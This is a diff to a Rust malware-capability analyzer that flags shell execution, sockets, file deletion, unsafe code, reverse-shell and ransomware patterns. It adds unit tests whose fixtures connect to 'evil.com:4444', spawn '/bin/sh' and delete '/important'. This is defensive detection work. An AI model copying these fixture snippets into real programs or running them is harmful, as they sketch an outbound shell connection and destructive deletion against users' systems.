@@ -14,16 +14,21 @@ pub struct RustAnalyzer {
 impl RustAnalyzer {
     pub fn new() -> Self {
         let mut parser = Parser::new();
-        parser.set_language(&tree_sitter_rust::LANGUAGE.into()).unwrap();
+        parser
+            .set_language(&tree_sitter_rust::LANGUAGE.into())
+            .unwrap();
 
-        Self { parser: RefCell::new(parser) }
+        Self {
+            parser: RefCell::new(parser),
+        }
     }
 
     fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
         let start = std::time::Instant::now();
 
         // Parse the Rust source
-        let tree = self.parser
+        let tree = self
+            .parser
             .borrow_mut()
             .parse(content, None)
             .context("Failed to parse Rust source")?;
@@ -65,12 +70,22 @@ impl RustAnalyzer {
         Ok(report)
     }
 
-    fn detect_capabilities(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
+    fn detect_capabilities(
+        &self,
+        node: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         let mut cursor = node.walk();
         self.walk_ast(&mut cursor, source, report);
     }
 
-    fn walk_ast(&self, cursor: &mut tree_sitter::TreeCursor, source: &[u8], report: &mut AnalysisReport) {
+    fn walk_ast(
+        &self,
+        cursor: &mut tree_sitter::TreeCursor,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         loop {
             let node = cursor.node();
 
@@ -111,51 +126,101 @@ impl RustAnalyzer {
 
             // Command execution
             if text.contains("Command::new") {
-                capabilities.push(("exec/command/shell", "Executes shell commands", "Command::new", 0.95));
+                capabilities.push((
+                    "exec/command/shell",
+                    "Executes shell commands",
+                    "Command::new",
+                    0.95,
+                    Criticality::Notable,
+                ));
             }
 
             // Network operations
             if text.contains("TcpStream::connect") {
-                capabilities.push(("net/socket/create", "TCP connection", "TcpStream::connect", 0.9));
+                capabilities.push((
+                    "net/socket/create",
+                    "TCP connection",
+                    "TcpStream::connect",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("TcpListener::bind") {
-                capabilities.push(("net/socket/server", "TCP server", "TcpListener::bind", 0.9));
+                capabilities.push((
+                    "net/socket/server",
+                    "TCP server",
+                    "TcpListener::bind",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
 
             // File operations
             if text.contains("fs::remove_dir_all") {
-                capabilities.push(("fs/delete", "Recursive directory deletion", "remove_dir_all", 0.95));
+                capabilities.push((
+                    "fs/delete",
+                    "Recursive directory deletion",
+                    "remove_dir_all",
+                    0.95,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("fs::remove_file") {
-                capabilities.push(("fs/delete", "Delete file", "remove_file", 0.9));
+                capabilities.push((
+                    "fs/delete",
+                    "Delete file",
+                    "remove_file",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
 
             // Reverse shell pattern
-            if (text.contains("TcpStream::connect") || text.contains("TcpStream")) &&
-               (text.contains("Command::new") || text.contains("/bin/sh") || text.contains("cmd.exe")) {
-                capabilities.push(("c2/reverse-shell", "Reverse shell connection", "TcpStream+Command", 0.98));
+            if (text.contains("TcpStream::connect") || text.contains("TcpStream"))
+                && (text.contains("Command::new")
+                    || text.contains("/bin/sh")
+                    || text.contains("cmd.exe"))
+            {
+                capabilities.push((
+                    "c2/reverse-shell",
+                    "Reverse shell connection",
+                    "TcpStream+Command",
+                    0.98,
+                    Criticality::Hostile,
+                ));
             }
 
             // Ransomware indicators
-            if (text.contains("aes") || text.contains("cipher")) &&
-               (text.contains("walkdir") || text.contains("read_dir")) {
-                capabilities.push(("crypto/ransomware/encrypt", "File encryption pattern", "crypto+walk", 0.92));
+            if (text.contains("aes") || text.contains("cipher"))
+                && (text.contains("walkdir") || text.contains("read_dir"))
+            {
+                capabilities.push((
+                    "crypto/ransomware/encrypt",
+                    "File encryption pattern",
+                    "crypto+walk",
+                    0.92,
+                    Criticality::Hostile,
+                ));
             }
 
             // Add capabilities
-            for (cap_id, desc, method, conf) in capabilities {
+            for (cap_id, desc, method, conf, criticality) in capabilities {
                 report.capabilities.push(Capability {
                     id: cap_id.to_string(),
                     description: desc.to_string(),
                     confidence: conf,
-                    criticality: Criticality::None,
+                    criticality,
                     mbc: None,
                     attack: None,
                     evidence: vec![Evidence {
                         method: "ast".to_string(),
                         source: "tree-sitter-rust".to_string(),
                         value: method.to_string(),
-                        location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                        location: Some(format!(
+                            "{}:{}",
+                            node.start_position().row,
+                            node.start_position().column
+                        )),
                     }],
                     traits: Vec::new(),
                     referenced_paths: None,
@@ -170,31 +235,59 @@ impl RustAnalyzer {
             let mut capabilities = Vec::new();
 
             if text.contains("std::process") || text.contains("std::process::Command") {
-                capabilities.push(("exec/command/shell", "Process execution import", "std::process", 0.8));
+                capabilities.push((
+                    "exec/command/shell",
+                    "Process execution import",
+                    "std::process",
+                    0.8,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("std::net") {
-                capabilities.push(("net/socket/create", "Network import", "std::net", 0.7));
+                capabilities.push((
+                    "net/socket/create",
+                    "Network import",
+                    "std::net",
+                    0.7,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("libc") {
-                capabilities.push(("exec/syscall", "Low-level system calls", "libc", 0.8));
+                capabilities.push((
+                    "exec/syscall",
+                    "Low-level system calls",
+                    "libc",
+                    0.8,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("libloading") || text.contains("dlopen") {
-                capabilities.push(("exec/dylib/load", "Dynamic library loading", "libloading", 0.9));
+                capabilities.push((
+                    "exec/dylib/load",
+                    "Dynamic library loading",
+                    "libloading",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
 
-            for (cap_id, desc, method, conf) in capabilities {
+            for (cap_id, desc, method, conf, criticality) in capabilities {
                 report.capabilities.push(Capability {
                     id: cap_id.to_string(),
                     description: desc.to_string(),
                     confidence: conf,
-                    criticality: Criticality::None,
+                    criticality,
                     mbc: None,
                     attack: None,
                     evidence: vec![Evidence {
                         method: "import".to_string(),
                         source: "tree-sitter-rust".to_string(),
                         value: method.to_string(),
-                        location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                        location: Some(format!(
+                            "{}:{}",
+                            node.start_position().row,
+                            node.start_position().column
+                        )),
                     }],
                     traits: Vec::new(),
                     referenced_paths: None,
@@ -211,22 +304,26 @@ impl RustAnalyzer {
                 id: "unsafe/block".to_string(),
                 description: "Unsafe code block".to_string(),
                 confidence: 1.0,
-                criticality: Criticality::None,
+                criticality: Criticality::Notable,
 
-                                    mbc: None,
+                mbc: None,
 
-                                    attack: None,
+                attack: None,
 
-                                    evidence: vec![Evidence {
+                evidence: vec![Evidence {
                     method: "ast".to_string(),
                     source: "tree-sitter-rust".to_string(),
                     value: "unsafe block".to_string(),
-                    location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                    location: Some(format!(
+                        "{}:{}",
+                        node.start_position().row,
+                        node.start_position().column
+                    )),
                 }],
                 traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
-                });
+                referenced_paths: None,
+                referenced_directories: None,
+            });
 
             // Check for specific unsafe operations
             if text.contains("transmute") {
@@ -234,17 +331,21 @@ impl RustAnalyzer {
                     id: "unsafe/transmute".to_string(),
                     description: "Type transmutation (unsafe cast)".to_string(),
                     confidence: 0.95,
-                    criticality: Criticality::None,
+                    criticality: Criticality::Notable,
 
-                                        mbc: None,
+                    mbc: None,
 
-                                        attack: None,
+                    attack: None,
 
-                                        evidence: vec![Evidence {
+                    evidence: vec![Evidence {
                         method: "ast".to_string(),
                         source: "tree-sitter-rust".to_string(),
                         value: "transmute".to_string(),
-                        location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                        location: Some(format!(
+                            "{}:{}",
+                            node.start_position().row,
+                            node.start_position().column
+                        )),
                     }],
                     traits: Vec::new(),
                     referenced_paths: None,
@@ -257,17 +358,21 @@ impl RustAnalyzer {
                     id: "unsafe/pointer".to_string(),
                     description: "Raw pointer operations".to_string(),
                     confidence: 0.9,
-                    criticality: Criticality::None,
+                    criticality: Criticality::Notable,
 
-                                        mbc: None,
+                    mbc: None,
 
-                                        attack: None,
+                    attack: None,
 
-                                        evidence: vec![Evidence {
+                    evidence: vec![Evidence {
                         method: "ast".to_string(),
                         source: "tree-sitter-rust".to_string(),
                         value: "raw pointers".to_string(),
-                        location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                        location: Some(format!(
+                            "{}:{}",
+                            node.start_position().row,
+                            node.start_position().column
+                        )),
                     }],
                     traits: Vec::new(),
                     referenced_paths: None,
@@ -280,17 +385,21 @@ impl RustAnalyzer {
                     id: "unsafe/inline-asm".to_string(),
                     description: "Inline assembly".to_string(),
                     confidence: 1.0,
-                    criticality: Criticality::None,
+                    criticality: Criticality::Notable,
 
-                                        mbc: None,
+                    mbc: None,
 
-                                        attack: None,
+                    attack: None,
 
-                                        evidence: vec![Evidence {
+                    evidence: vec![Evidence {
                         method: "ast".to_string(),
                         source: "tree-sitter-rust".to_string(),
                         value: "asm!".to_string(),
-                        location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                        location: Some(format!(
+                            "{}:{}",
+                            node.start_position().row,
+                            node.start_position().column
+                        )),
                     }],
                     traits: Vec::new(),
                     referenced_paths: None,
@@ -304,17 +413,21 @@ impl RustAnalyzer {
                     id: "unsafe/ffi".to_string(),
                     description: "Foreign function interface (C boundary)".to_string(),
                     confidence: 0.95,
-                    criticality: Criticality::None,
+                    criticality: Criticality::Notable,
 
-                                        mbc: None,
+                    mbc: None,
 
-                                        attack: None,
+                    attack: None,
 
-                                        evidence: vec![Evidence {
+                    evidence: vec![Evidence {
                         method: "ast".to_string(),
                         source: "tree-sitter-rust".to_string(),
                         value: "extern".to_string(),
-                        location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                        location: Some(format!(
+                            "{}:{}",
+                            node.start_position().row,
+                            node.start_position().column
+                        )),
                     }],
                     traits: Vec::new(),
                     referenced_paths: None,
@@ -331,17 +444,21 @@ impl RustAnalyzer {
                     id: "unsafe/inline-asm".to_string(),
                     description: "Inline assembly macro".to_string(),
                     confidence: 1.0,
-                    criticality: Criticality::None,
+                    criticality: Criticality::Notable,
 
-                                        mbc: None,
+                    mbc: None,
 
-                                        attack: None,
+                    attack: None,
 
-                                        evidence: vec![Evidence {
+                    evidence: vec![Evidence {
                         method: "ast".to_string(),
                         source: "tree-sitter-rust".to_string(),
                         value: text.split('!').next().unwrap_or("asm").to_string(),
-                        location: Some(format!("{}:{}", node.start_position().row, node.start_position().column)),
+                        location: Some(format!(
+                            "{}:{}",
+                            node.start_position().row,
+                            node.start_position().column
+                        )),
                     }],
                     traits: Vec::new(),
                     referenced_paths: None,
@@ -351,19 +468,31 @@ impl RustAnalyzer {
         }
     }
 
-    fn extract_functions(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
+    fn extract_functions(
+        &self,
+        node: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         let mut cursor = node.walk();
         self.walk_for_functions(&mut cursor, source, report);
     }
 
-    fn walk_for_functions(&self, cursor: &mut tree_sitter::TreeCursor, source: &[u8], report: &mut AnalysisReport) {
+    fn walk_for_functions(
+        &self,
+        cursor: &mut tree_sitter::TreeCursor,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         loop {
             let node = cursor.node();
 
             if node.kind() == "function_item" {
-                if let Ok(text) = node.utf8_text(source) {
+                if let Ok(_text) = node.utf8_text(source) {
                     // Extract function name
-                    let name = self.extract_function_name(&node, source).unwrap_or_else(|| "anonymous".to_string());
+                    let name = self
+                        .extract_function_name(&node, source)
+                        .unwrap_or_else(|| "anonymous".to_string());
 
                     report.functions.push(Function {
                         name,
@@ -377,9 +506,9 @@ impl RustAnalyzer {
                         register_usage: None,
                         constants: Vec::new(),
                         properties: None,
-                    signature: None,
-                    nesting: None,
-                    call_patterns: None,
+                        signature: None,
+                        nesting: None,
+                        call_patterns: None,
                     });
                 }
             }
@@ -428,5 +557,267 @@ impl Analyzer for RustAnalyzer {
 
     fn can_analyze(&self, file_path: &Path) -> bool {
         file_path.extension().and_then(|e| e.to_str()) == Some("rs")
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::path::PathBuf;
+
+    fn analyze_rust_code(code: &str) -> AnalysisReport {
+        let analyzer = RustAnalyzer::new();
+        let path = PathBuf::from("test.rs");
+        analyzer.analyze_source(&path, code).unwrap()
+    }
+
+    #[test]
+    fn test_can_analyze_rs_extension() {
+        let analyzer = RustAnalyzer::new();
+        assert!(analyzer.can_analyze(&PathBuf::from("test.rs")));
+        assert!(analyzer.can_analyze(&PathBuf::from("/path/to/main.rs")));
+    }
+
+    #[test]
+    fn test_cannot_analyze_other_extension() {
+        let analyzer = RustAnalyzer::new();
+        assert!(!analyzer.can_analyze(&PathBuf::from("test.c")));
+        assert!(!analyzer.can_analyze(&PathBuf::from("test.py")));
+    }
+
+    #[test]
+    fn test_structural_feature() {
+        let code = r#"
+fn main() {
+    println!("Hello, world!");
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .structure
+            .iter()
+            .any(|s| s.id == "source/language/rust"));
+    }
+
+    #[test]
+    fn test_detect_command_new() {
+        let code = r#"
+use std::process::Command;
+fn main() {
+    Command::new("whoami").spawn().unwrap();
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/command/shell"));
+    }
+
+    #[test]
+    fn test_detect_tcpstream_connect() {
+        let code = r#"
+use std::net::TcpStream;
+fn main() {
+    let stream = TcpStream::connect("evil.com:4444").unwrap();
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/socket/create"));
+    }
+
+    #[test]
+    fn test_detect_tcplistener_bind() {
+        let code = r#"
+use std::net::TcpListener;
+fn main() {
+    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/socket/server"));
+    }
+
+    #[test]
+    fn test_detect_remove_dir_all() {
+        let code = r#"
+use std::fs;
+fn main() {
+    fs::remove_dir_all("/important").unwrap();
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report.capabilities.iter().any(|c| c.id == "fs/delete"));
+    }
+
+    #[test]
+    fn test_detect_remove_file() {
+        let code = r#"
+use std::fs;
+fn main() {
+    fs::remove_file("secret.txt").unwrap();
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report.capabilities.iter().any(|c| c.id == "fs/delete"));
+    }
+
+    #[test]
+    fn test_detect_unsafe_block() {
+        let code = r#"
+fn main() {
+    unsafe {
+        let x = 42;
+    }
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report.capabilities.iter().any(|c| c.id == "unsafe/block"));
+    }
+
+    #[test]
+    fn test_detect_transmute() {
+        let code = r#"
+use std::mem;
+fn main() {
+    unsafe {
+        let x: u32 = mem::transmute(42.0f32);
+    }
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "unsafe/transmute"));
+    }
+
+    #[test]
+    fn test_detect_raw_pointers() {
+        let code = r#"
+fn main() {
+    unsafe {
+        let ptr: *const i32 = &42;
+        let mut_ptr: *mut i32 = &mut 42;
+    }
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report.capabilities.iter().any(|c| c.id == "unsafe/pointer"));
+    }
+
+    #[test]
+    fn test_detect_inline_asm() {
+        let code = r#"
+use std::arch::asm;
+fn main() {
+    unsafe {
+        asm!("nop");
+    }
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "unsafe/inline-asm"));
+    }
+
+    #[test]
+    fn test_import_std_process() {
+        let code = r#"
+use std::process::Command;
+fn main() {}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/command/shell"));
+    }
+
+    #[test]
+    fn test_import_std_net() {
+        let code = r#"
+use std::net::TcpStream;
+fn main() {}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/socket/create"));
+    }
+
+    #[test]
+    fn test_import_libc() {
+        let code = r#"
+use libc::fork;
+fn main() {}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report.capabilities.iter().any(|c| c.id == "exec/syscall"));
+    }
+
+    #[test]
+    fn test_import_libloading() {
+        let code = r#"
+use libloading::Library;
+fn main() {}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/dylib/load"));
+    }
+
+    #[test]
+    fn test_extract_functions() {
+        let code = r#"
+fn function_one() {
+    println!("one");
+}
+
+fn function_two(x: i32) -> i32 {
+    x + 1
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert_eq!(report.functions.len(), 2);
+        assert!(report.functions.iter().any(|f| f.name == "function_one"));
+        assert!(report.functions.iter().any(|f| f.name == "function_two"));
+    }
+
+    #[test]
+    fn test_multiple_capabilities() {
+        let code = r#"
+use std::process::Command;
+use std::net::TcpStream;
+fn main() {
+    let stream = TcpStream::connect("evil.com:4444").unwrap();
+    Command::new("/bin/sh").spawn().unwrap();
+    unsafe {
+        let ptr: *const i32 = &42;
+    }
+}
+"#;
+        let report = analyze_rust_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/socket/create"));
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.capabilities.iter().any(|c| c.id == "unsafe/block"));
+        assert!(report.capabilities.len() >= 3);
     }
 }
